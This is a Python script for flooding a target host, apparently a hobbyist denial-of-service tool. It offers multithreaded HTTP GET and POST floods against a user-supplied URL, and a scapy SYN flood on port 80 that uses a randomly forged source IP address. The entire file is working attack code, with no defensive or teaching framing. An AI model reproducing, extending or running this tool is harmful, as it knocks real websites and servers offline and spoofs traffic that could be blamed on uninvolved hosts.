import time

import re
import requests
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.http import HTTPRequest,TCP
import random
from colorama import init, Fore
red=Fore.RED
green=Fore.GREEN
reset=Fore.RESET
def banner():

    print(f"""{red}
            |------| |-----| ||    || |-----| |------- |------|
            |      | |     | | |  | | |     | |        |      |
            |      | |     | |  ||  | |     | |-----   |------|
            |------| |     | |      | |-----| |        ||
            |      | |     | |      | |     | |        | |
            |------| |-----| |      | |-----| |------  |  |
     @developer-mayankpal | github:github.com/mayankpalcs   |
""")
banner()
a = random.randint(1,244)
b = random.randint(1,244)
c = random.randint(1,244)
d = random.randint(1,244)
randomip=str(a)+'.'+str(b)+'.'+str(c)+'.'+str(d)

threads=int(input(f'{red}[+]Enter number threads'))
time.sleep(1)
print(f"""
{red}
1:http get requests flood
2:http post requests floood
3:SYN flooad
""")
o=int(input(f'{red}[+]What kind of attack'))
if o==3:
    target = input(f'[+]{red}Enter host or ip ex:google.com')
    no = int(input(f'[+]{red}Enter the no. of packets you want to send'))
    def pa(n):
        while i<no:
            packets=IP(dst=target,src=randomip)/TCP(dport=80,flags="S")
            send(packets)
    for i in range(threads+1):
        t=threading.Thread(target=pa,args=(i,))
        t.start()
elif o==1:
    s = int(input(f'{red}[+]Enter how how many get requests you want to send'))
    print(f'{green}[+]Note:requets sent will be no.of requests*no of threads you chose priveously')
    time.sleep(1)
    target = input(f'{red}[+]Enter url note:include http or other protocol too')

    def getrequest(p):

        i=0
        while i<s:

            i=i+1
            try:
                requestpack = requests.get(target)
            except Exception as e:
                pass
            print(f'[+]{red}sending request')
        print(f'{red}[+]request sent {s*threads}')
    for i in range(threads):

        t=threading.Thread(target=getrequest,args=(i,))
        t.start()


elif o==2:
    s = int(input(f'[+]{red}Enter how how many post requests you want to send'))
    target = input(f'[+]{red}Enter url note:inclue http or other protocol too')
    ls2=['pon','damn','kon','sen','pen','code']
    ls5=['umy','yum','lol','ser','poke']
    io=random.choice(ls2)
    io2=random.choice(ls5)
    lol={io:io2}
    def postrequest(p):

        i = 0
        while i < s:
            i = i + 1
            try:
                postack = requests.post(target,json=lol)
            except Exception as e:
                pass
            print(f"[+]{red}sending request")
        print(f'{red}[+]request sent {s * threads}')

    for i in range(threads):
        tr = threading.Thread(target=postrequest, args=(i,))
        tr.start()


